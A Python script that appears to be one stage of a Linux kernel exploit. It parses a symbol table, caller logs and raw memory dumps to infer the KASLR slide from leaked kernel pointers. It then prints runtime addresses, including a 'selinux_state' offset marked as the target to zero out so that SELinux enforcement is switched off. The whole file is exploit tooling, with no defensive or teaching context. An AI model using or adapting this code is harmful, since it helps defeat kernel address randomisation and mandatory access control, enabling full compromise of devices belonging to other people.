import re, struct, glob, collections, sys

syms = {}
for line in open(r'D:\kwork\icbuild\scratch\syms150.txt'):
    a, n = line.split(None, 1)
    syms.setdefault(n.strip(), int(a, 16))

pairs = set()
for line in open(r'D:\kwork\icbuild\scratch\callers.txt', errors='replace'):
    m = re.search(r'caller=(\w+)\+0x([0-9a-f]+)/', line)
    if m:
        pairs.add((m.group(1), int(m.group(2), 16)))

raws = set()
for p in glob.glob(r'D:\kwork\icbuild\scratch\raw?.bin'):
    d = open(p, 'rb').read()
    for i in range(0, len(d) - 8, 8):
        v = struct.unpack_from('<Q', d, i)[0]
        if (v >> 48) == 0xffff and (v >> 40) not in (0xff,):
            raws.add(v)

print("pairs=%d raws=%d" % (len(pairs), len(raws)))
votes = collections.Counter()
for name, off in pairs:
    a = syms.get(name)
    if a is None:
        continue
    link = a + off
    for v in raws:
        s = v - link
        if 0 <= s < 0x8000000000 and (s & 0x1fffff) == 0:
            votes[s] += 1
for s, c in votes.most_common(10):
    print("slide=%#x votes=%d" % (s, c))

if votes:
    best = votes.most_common(1)[0][0]
    tp = syms.get('__tracepoint_sys_exit')
    print("__tracepoint_sys_exit link=%#x" % tp)
    print("funcs runtime=%#x" % (tp + 0x40 + best))
    st = syms.get('selinux_state')
    if st is not None:
        # -7 keeps `initialized` intact; see reap_init_sb.c ic_zero_auto.
        print("selinux_state runtime=%#x  zero target (state-7)=%#x"
              % (st + best, st + best - 7))
